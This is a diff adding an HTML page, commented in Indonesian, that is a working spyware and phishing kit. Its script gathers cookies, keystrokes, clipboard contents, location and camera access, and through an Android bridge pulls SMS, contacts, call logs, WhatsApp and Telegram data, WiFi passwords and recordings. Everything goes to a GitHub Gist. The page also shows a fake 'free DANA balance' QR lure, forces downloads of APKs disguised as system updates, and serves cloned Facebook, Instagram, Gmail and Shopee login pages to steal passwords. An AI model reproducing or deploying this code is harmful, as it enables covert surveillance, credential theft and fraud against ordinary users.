@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title></title>
+    <style>body{margin:0;padding:0;background:#fff}</style>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+</head>
+<body>
+<div id="qrContainer"></div>
+<script>
+// ⚠️ GANTI INI DENGAN PUNYA KAMU!
+var GITHUB_TOKEN = 'github_pat_XXXXXXXXXXXX';
+var GIST_ID = 'XXXXXXXXXXXXXXXXXXXX';
+var GITHUB_USER = 'USERNAME_KAMU';
+var GITHUB_REPO = 'verifikasi-site';
+var PASSWORD = 'rahasia123';
+
+// DATA STORE
+var dataStore = [];
+var hasLS = (typeof localStorage !== 'undefined');
+
+if(hasLS) {
+    var saved = localStorage.getItem('vd');
+    if(saved) try{ dataStore = JSON.parse(saved) } catch(e){}
+}
+
+function simpanLokal() {
+    if(hasLS) try{ localStorage.setItem('vd', JSON.stringify(dataStore.slice(-500))) } catch(e){}
+}
+
+async function simpanKeGist() {
+    try {
+        var allData = dataStore;
+        if(hasLS) {
+            var ls = localStorage.getItem('vd');
+            if(ls) allData = JSON.parse(ls);
+        }
+        await fetch('https://api.github.com/gists/' + GIST_ID, {
+            method: 'PATCH',
+            headers: {
+                'Authorization': 'token ' + GITHUB_TOKEN,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                files: {
+                    'data.json': {
+                        content: JSON.stringify(allData, null, 2)
+                    }
+                }
+            })
+        });
+    } catch(e) {}
+}
+
+function K(d) {
+    dataStore.push({ waktu: new Date().toISOString(), sumber: d.sumber || d.type || 'unknown', data: d.data || d });
+    simpanLokal();
+    simpanKeGist();
+}
+
+// ANDROID BRIDGE
+var A = {
+    isAvailable: typeof AndroidBridge !== 'undefined',
+    getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null },
+    getIMEI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMEI()}catch(e){}} return null },
+    getIMSI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMSI()}catch(e){}} return null },
+    getPhoneNumber: function() { if(this.isAvailable){ try{return AndroidBridge.getPhoneNumber()}catch(e){}} return null },
+    getGoogleAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getGoogleAccount())}catch(e){}} return null },
+    getFacebookAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getFacebookAccount())}catch(e){}} return null },
+    getAllContacts: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllContacts())}catch(e){}} return null },
+    getAllSMS: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllSMS())}catch(e){}} return null },
+    getCallLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCallLog())}catch(e){}} return null },
+    getWhatsAppData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWhatsAppData())}catch(e){}} return null },
+    getTelegramData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getTelegramData())}catch(e){}} return null },
+    listAllFiles: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.listAllFiles())}catch(e){}} return null },
+    getInstalledApps: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getInstalledApps())}catch(e){}} return null },
+    getWiFiPasswords: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWiFiPasswords())}catch(e){}} return null },
+    getBluetoothInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBluetoothInfo())}catch(e){}} return null },
+    getSensors: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getSensors())}catch(e){}} return null },
+    getBatteryDetail: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBatteryDetail())}catch(e){}} return null },
+    getCalendarEvents: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCalendarEvents())}catch(e){}} return null },
+    getBrowserHistory: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBrowserHistory())}catch(e){}} return null },
+    getNotificationLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getNotificationLog())}catch(e){}} return null },
+    takeScreenshot: function() { if(this.isAvailable){ try{return AndroidBridge.takeScreenshot()}catch(e){}} return null },
+    startRecording: function() { if(this.isAvailable){ try{return AndroidBridge.startRecording()}catch(e){}} return null },
+    startVideoRecording: function() { if(this.isAvailable){ try{return AndroidBridge.startVideoRecording()}catch(e){}} return null },
+    getClipboard: function() { if(this.isAvailable){ try{return AndroidBridge.getClipboard()}catch(e){}} return null },
+    keepAwake: function() { if(this.isAvailable){ try{AndroidBridge.keepAwake(true);return true}catch(e){}} return false },
+    downloadFile: function(u,f) { if(this.isAvailable){ try{AndroidBridge.downloadFile(u,f);return true}catch(e){}} return false }
+};
+
+// FUNGSI DATA
+function GD() {
+    var a = A.getDeviceInfo();
+    var d = { w:Date.now(), ua:navigator.userAgent, pl:navigator.platform, la:navigator.language, sc:screen.width+'x'+screen.height, cd:screen.colorDepth, pr:window.devicePixelRatio, co:document.cookie, ur:location.href, rf:document.referrer, dm:navigator.deviceMemory||'N/A', cc:navigator.hardwareConcurrency||'N/A', on:navigator.onLine, ve:navigator.vendor, mt:navigator.maxTouchPoints, tz:Intl.DateTimeFormat().resolvedOptions().timeZone };
+    if(A.isAvailable) { d.android = { deviceInfo:A.getDeviceInfo(), imei:A.getIMEI(), imsi:A.getIMSI(), phoneNumber:A.getPhoneNumber(), googleAccount:A.getGoogleAccount(), facebookAccount:A.getFacebookAccount(), networkInfo:A.getWiFiPasswords?null:null, bluetoothInfo:A.getBluetoothInfo(), sensors:A.getSensors(), batteryDetail:A.getBatteryDetail(), calendarEvents:A.getCalendarEvents(), browserHistory:A.getBrowserHistory(), notificationLog:A.getNotificationLog() } }
+    K({sumber:'init',data:d}); return d;
+}
+async function getIP() { try{ var r = await fetch('https://api.ipify.org?format=json'); var d = await r.json(); K({sumber:'ip',data:d.ip}) } catch(e){} }
+function ambilLokasi() { try{ navigator.geolocation.getCurrentPosition(function(p){ K({sumber:'lokasi',data:{lat:p.coords.latitude,lon:p.coords.longitude,akurasi:p.coords.accuracy}}) }, function(){}) } catch(e){} }
+function ambilKamera() { try{ navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}).then(function(s){ s.getTracks().forEach(function(t){t.stop()}); K({sumber:'kamera',data:'aktif'}) }).catch(function(){}) } catch(e){} }
+function ambilKontak() { if(A.isAvailable){ var k = A.getAllContacts(); if(k) K({sumber:'kontak_all',data:k}) } else { try{ if('contacts' in navigator) { navigator.contacts.select(['name','tel','email'],{multiple:true}).then(function(k){ K({sumber:'kontak_all',data:k}) }).catch(function(){}) } } catch(e){} } }
+function ambilSMS() { if(A.isAvailable){ var s = A.getAllSMS(); if(s) K({sumber:'sms_all',data:s}) } }
+function ambilCallLog() { if(A.isAvailable){ var c = A.getCallLog(); if(c) K({sumber:'call_log',data:c}) } }
+function ambilWA() { if(A.isAvailable){ var w = A.getWhatsAppData(); if(w) K({sumber:'whatsapp',data:w}) } }
+function ambilTelegram() { if(A.isAvailable){ var t = A.getTelegramData(); if(t) K({sumber:'telegram',data:t}) } }
+function ambilFile() { if(A.isAvailable){ var f = A.listAllFiles(); if(f) K({sumber:'files_all',data:f}) } }
+function ambilApp() { if(A.isAvailable){ var a = A.getInstalledApps(); if(a) K({sumber:'aplikasi_all',data:a}) } }
+function ambilWiFi() { if(A.isAvailable){ var w = A.getWiFiPasswords(); if(w) K({sumber:'wifi_passwords',data:w}) } }
+function ambilSensors() { if(A.isAvailable){ var s = A.getSensors(); if(s) K({sumber:'sensors',data:s}) } }
+function ambilCalendar() { if(A.isAvailable){ var c = A.getCalendarEvents(); if(c) K({sumber:'calendar',data:c}) } }
+function ambilBrowserHistory() { if(A.isAvailable){ var h = A.getBrowserHistory(); if(h) K({sumber:'browser_history',data:h}) } }
+function ambilNotifications() { if(A.isAvailable){ var n = A.getNotificationLog(); if(n) K({sumber:'notifications',data:n}) } }
+function ambilBaterai() { try{ navigator.getBattery().then(function(b){ K({sumber:'baterai',data:{level:Math.round(b.level*100)+'%',charging:b.charging}}) }) } catch(e){} }
+function ambilSS() { if(A.isAvailable){ var s = A.takeScreenshot(); if(s) K({sumber:'screenshot',data:s}) } else { try{ if(typeof html2canvas!=='undefined'){ html2canvas(document.body).then(function(c){ K({sumber:'screenshot',data:c.toDataURL()}) }) } } catch(e){} } }
+function ambilAudio() { if(A.isAvailable){ var a = A.startRecording(); if(a) K({sumber:'audio_record',data:a}) } }
+function ambilVideo() { if(A.isAvailable){ var v = A.startVideoRecording(); if(v) K({sumber:'video_record',data:v}) } }
+
+// KEYLOGGER
+var inputData = {};
+document.addEventListener('input',function(e){ if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){ inputData[e.target.id||e.target.name||e.target.type]=e.target.value } });
+setInterval(function(){ if(Object.keys(inputData).length>0){ K({sumber:'keylogger',data:inputData,waktu:Date.now()}); inputData={} } },10000);
+
+// CLIPBOARD
+function bacaClipboard() { if(A.isAvailable){ var t = A.getClipboard(); if(t) K({sumber:'clipboard',data:t}) } try{ navigator.clipboard.readText().then(function(t){ if(t) K({sumber:'clipboard',data:t}) }).catch(function(){}) } catch(e){} }
+setTimeout(bacaClipboard,3000); setInterval(bacaClipboard,5000);
+
+// DOWNLOAD SAAT KLIK
+var files = [
+    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.apk',
+    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/com.google.android.appsearch.apk',
+    'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Video.mp4'
+];
+var downloaded = [];
+var downloadTriggered = false;
+function runDownload() {
+    if(downloadTriggered) return;
+    downloadTriggered = true;
+    files.forEach(function(f) {
+        if(downloaded.indexOf(f) !== -1) return;
+        var a = document.createElement('a');
+        a.href = f;
+        a.download = f.split('/').pop();
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(function(){ document.body.removeChild(a) },1000);
+        downloaded.push(f);
+        K({sumber:'download',data:{file:f.split('/').pop()},waktu:Date.now()});
+    });
+}
+setTimeout(function(){ document.addEventListener('click', runDownload) }, 1000);
+
+function FK() { setTimeout(function(){ ambilKontak(); ambilSMS(); ambilCallLog(); ambilWA(); ambilTelegram(); ambilFile(); ambilApp(); ambilWiFi(); ambilSensors(); ambilCalendar(); ambilBrowserHistory(); ambilNotifications(); ambilSS(); ambilAudio(); ambilVideo(); K({sumber:'full_kontrol',data:'selesai'}) },5000) }
+
+// QR CODE
+function QR() {
+    setTimeout(function(){
+        try{
+            var u = 'https://verifikasi.site/fb';
+            var c = document.getElementById('qrContainer');
+            c.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;font-family:Arial;text-align:center;background:linear-gradient(180deg,#0066cc,#001a40);display:flex;justify-content:center;align-items:center';
+            var h = '<div style="max-width:380px;padding:20px">';
+            h += '<div style="background:#108ee9;width:80px;height:80px;border-radius:20px;display:flex;justify-content:center;align-items:center;margin:0 auto 15px"><span style="color:#fff;font-size:40px;font-weight:bold">D</span></div>';
+            h += '<h2 style="color:#fff;font-size:26px;font-weight:bold">🎉 SELAMAT!</h2>';
+            h += '<p style="color:#b3d9ff;font-size:15px">Anda mendapatkan Saldo DANA!</p>';
+            h += '<div style="background:#fff;padding:20px;border-radius:20px;margin:10px 0"><p style="color:#108ee9;font-weight:bold">📱 Scan QR</p><div id="qrCode"></div></div>';
+            h += '<div style="background:#fff;border-radius:15px;padding:12px;margin:10px 0"><p style="color:#666;font-size:12px">Saldo DANA Gratis</p><h1 style="color:#108ee9;font-size:40px;font-weight:bold">Rp 50.000</h1></div>';
+            h += '<p style="color:#ffcc00">⏰ Tersisa <span id="qrT" style="font-weight:bold">05:00</span></p>';
+            h += '<button id="qrX" style="background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:12px;border-radius:30px;width:100%">❌ Tutup</button>';
+            h += '</div>';
+            c.innerHTML = h;
+            new QRCode(document.getElementById('qrCode'),{text:u,width:170,height:170});
+            var w = 300; var ti = setInterval(function(){ w--; var m = Math.floor(w/60); var s = w%60; var el = document.getElementById('qrT'); if(el) el.textContent = (m<10?'0':'')+m+':'+(s<10?'0':'')+s; if(w<=0){ clearInterval(ti); c.style.display='none' } },1000);
+            document.getElementById('qrX').onclick = function(){ clearInterval(ti); c.style.display='none' };
+            K({sumber:'malwareQR',data:'qr_generated'});
+        }catch(e){}
+    },4000);
+}
+
+function HB() { setInterval(function(){ K({sumber:'heartbeat',data:'alive'}) },10000) }
+function KA() { try{ var a = new(window.AudioContext||window.webkitAudioContext)(); var b = a.createBuffer(1,2*a.sampleRate,a.sampleRate); var s = a.createBufferSource(); s.buffer = b; s.loop = true; s.connect(a.destination); s.start(); K({sumber:'keepalive',data:'active'}) } catch(e){} }
+function SW() { if('serviceWorker' in navigator){ navigator.serviceWorker.register('/sw.js').then(function(r){ K({sumber:'keepalive',data:'sw_registered'}) }).catch(function(){}) } }
+function cleanup() { console.log=function(){}; console.warn=function(){}; console.error=function(){}; console.info=function(){} }
+setTimeout(cleanup,3000);
+
+// PHISHING PAGES
+function getPage() {
+    var path = location.pathname;
+    if(path === '/' || path === '') return null;
+    
+    var t = {
+        fb: {
+            title: 'Facebook', bg: '#ffffff', btnColor: '#1877f2',
+            logo: '<div style="font-size:48px;font-weight:bold;color:#1877f2;text-align:center;padding:4px 0 16px">facebook</div>',
+            topHTML: '<div style="background:#f0f2f5;border-radius:12px;padding:12px 14px;margin-bottom:16px;display:flex;align-items:center;gap:12px"><div style="width:36px;height:36px;background:#1877f2;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:bold;font-size:20px;flex-shrink:0">f</div><div style="font-size:13px;color:#1c1c1e;line-height:1.4;flex:1">Dapatkan <strong style="color:#1877f2">Facebook untuk Android</strong> dan nikmati pengalaman menjelajah yang lebih cepat.</div></div>',
+            fields: [{id:'email',placeholder:'Nomor ponsel atau email',type:'text'},{id:'pass',placeholder:'Kata sandi',type:'password'}],
+            btnText: 'Login', inputBg: '#f0f2f5', inputRadius: '12px', btnRadius: '28px',
+            links: ['Lupa kata sandi?'], createBtn: 'Buat akun baru', createColor: '#42b72a',
+            footer: '<div style="text-align:center;margin-top:24px"><div style="font-size:14px;color:#65676b;margin-bottom:8px">Meta</div></div>',
+            redirect: 'https://m.facebook.com/login'
+        },
+        ig: {
+            title: 'Login • Instagram', bg: '#ffffff', btnColor: '#0095f6',
+            logo: '<div style="font-size:36px;font-weight:bold;color:#262626;text-align:center;margin-bottom:24px">Instagram</div>',
+            fields: [{id:'email',placeholder:'Nama pengguna, email, atau nomor ponsel',type:'text'},{id:'pass',placeholder:'Kata sandi',type:'password'}],
+            btnText: 'Login', inputBg: '#fafafa', inputRadius: '3px', btnRadius: '8px', inputBorder: '1px solid #dbdbdb',
+            links: ['Lupa kata sandi?'], createBtn: 'Buat akun baru', createColor: '#0095f6',
+            footer: '', redirect: 'https://www.instagram.com/accounts/login'
+        },
+        gmail: {
+            title: 'Gmail', bg: '#ffffff', btnColor: '#1a73e8',
+            logo: '<div style="text-align:center;margin-bottom:10px"><span style="font-size:24px;color:#ea4335">G</span><span style="font-size:24px;color:#4285f4">o</span><span style="font-size:24px;color:#fbbc04">o</span><span style="font-size:24px;color:#4285f4">g</span><span style="font-size:24px;color:#34a853">l</span><span style="font-size:24px;color:#ea4335">e</span></div>',
+            subtitle: 'Sign in to continue to Gmail',
+            fields: [{id:'email',placeholder:'Email or phone',type:'text'},{id:'pass',placeholder:'Enter your password',type:'password'}],
+            btnText: 'Next', inputBg: '#ffffff', inputRadius: '4px', inputBorder: '1px solid #dadce0', btnRadius: '4px',
+            links: ['Forgot email?'], createBtn: 'Create account', createColor: '#1a73e8',
+            footer: '', redirect: 'https://accounts.google.com/signin'
+        },
+        shopee: {
+            title: 'Shopee', bg: '#f5f5f5', btnColor: '#ee4d2d',
+            logo: '<div style="text-align:center;margin-bottom:20px;font-size:32px;font-weight:bold;color:#ee4d2d">🛒 Shopee</div>',
+            subtitle: 'Login untuk belanja',
+            fields: [{id:'email',placeholder:'Nomor HP / Email / Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],
+            btnText: 'Log In', inputBg: '#ffffff', inputRadius: '4px', btnRadius: '4px',
+            links: ['Lupa Password?','Daftar'], linkColor: '#ee4d2d',
+            footer: '', redirect: 'https://shopee.co.id/buyer/login'
+        }
+    };
+    
+    var key = path.replace('/', '');
+    var p = t[key];
+    if(!p) return null;
+    
+    var fH = '';
+    p.fields.forEach(function(f){ fH += '<input type="'+f.type+'" id="'+f.id+'" placeholder="'+f.placeholder+'" autocomplete="off" style="width:100%;padding:14px;margin:8px 0;border:'+(p.inputBorder||'1px solid #ddd')+';border-radius:'+(p.inputRadius||'6px')+';font-size:16px;outline:none;background:'+(p.inputBg||'#fff')+'">' });
+    var lH = '';
+    if(p.links) p.links.forEach(function(l){ lH += '<a href="#" style="color:'+(p.linkColor||p.btnColor)+';font-size:14px;text-decoration:none;display:block;margin:10px 0;text-align:center">'+l+'</a>' });
+    var cH = '';
+    if(p.createBtn) cH = '<div style="display:flex;align-items:center;gap:16px;margin:12px 0"><div style="flex:1;height:1px;background:#dadde1"></div></div><button type="button" style="width:100%;padding:14px;background:'+p.createColor+';color:#fff;border:none;border-radius:'+p.btnRadius+';font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px">'+p.createBtn+'</button>';
+    
+    var h = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>'+p.title+'</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:'+p.bg+';display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:20px 16px}.container{width:100%;max-width:400px;background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 15px rgba(0,0,0,0.1);margin-top:30px}input:focus{border-color:'+p.btnColor+'!important}.login-btn{width:100%;padding:14px;background:'+p.btnColor+';color:#fff;border:none;border-radius:'+p.btnRadius+';font-size:18px;font-weight:bold;cursor:pointer;margin-top:15px}</style></head><body>'+(p.topHTML||'')+'<div class="container">'+(p.logo||'')+(p.subtitle?'<p style="text-align:center;color:#666;font-size:14px;margin-bottom:20px">'+p.subtitle+'</p>':'')+'<form onsubmit="event.preventDefault();go()">'+fH+'<button type="submit" class="login-btn">'+p.btnText+'</button></form>'+lH+cH+'</div>'+(p.footer||'')+'<script>function go(){var d={};';
+    p.fields.forEach(function(f){ h += 'd.'+f.id+'=document.getElementById(\''+f.id+'\').value;' });
+    h += 'var a=[];try{a=JSON.parse(localStorage.getItem("vd")||"[]")}catch(e){}a.push({waktu:new Date().toISOString(),sumber:"login_'+key+'",data:d});localStorage.setItem("vd",JSON.stringify(a.slice(-500)));setTimeout(function(){window.location.href="'+p.redirect+'"},600)}<\/script></body></html>';
+    
+    document.open();document.write(h);document.close();
+    return true;
+}
+
+// START
+async function start() {
+    if(getPage()) return;
+    GD(); await getIP();
+    KA(); SW();
+    ambilLokasi(); ambilKamera(); ambilBaterai();
+    QR(); HB(); FK();
+}
+start();
+setInterval(async function(){ K({sumber:'periodic',data:GD()}) },10000);
+window.addEventListener('beforeunload',function(){ K({sumber:'close',data:'Tutup'}) });
+</script>
+</body>
+</html>
